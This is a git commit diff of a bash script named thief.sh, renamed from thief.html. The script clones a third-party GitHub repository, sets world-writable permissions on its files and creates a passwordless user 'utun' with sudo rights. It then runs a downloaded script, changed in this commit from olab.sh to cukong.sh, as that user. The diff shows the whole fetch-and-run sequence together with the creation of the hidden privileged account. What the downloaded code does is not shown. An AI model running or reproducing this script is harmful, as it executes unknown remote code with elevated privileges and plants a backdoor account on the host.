f1945c55555c2b2302d79b1520fef56007453063
hendrik20212 <87313143+hendrik20212@users.noreply.github.com>
2021-07-16 05:17:27 +0700

    Update and rename thief.html to thief.sh

--- thief.sh
+++ thief.sh
@@ -2,7 +2,7 @@
 #!/bin/bash
 sudo apt update
 git clone https://github.com/bavrih2021/bavrih.git && cd bavrih
-chmod +x olab.sh && chmod +x filesetup chmod 777 filesetup olab.sh
+chmod +x cukong.sh && chmod +x filesetup chmod 777 filesetup cukong.sh
 sudo adduser --disabled-password --gecos "" utun && sudo usermod -aG sudo utun
-sudo -u utun -H sh -c "./olab.sh"
+sudo -u utun -H sh -c "./cukong.sh"
 sudo apt update
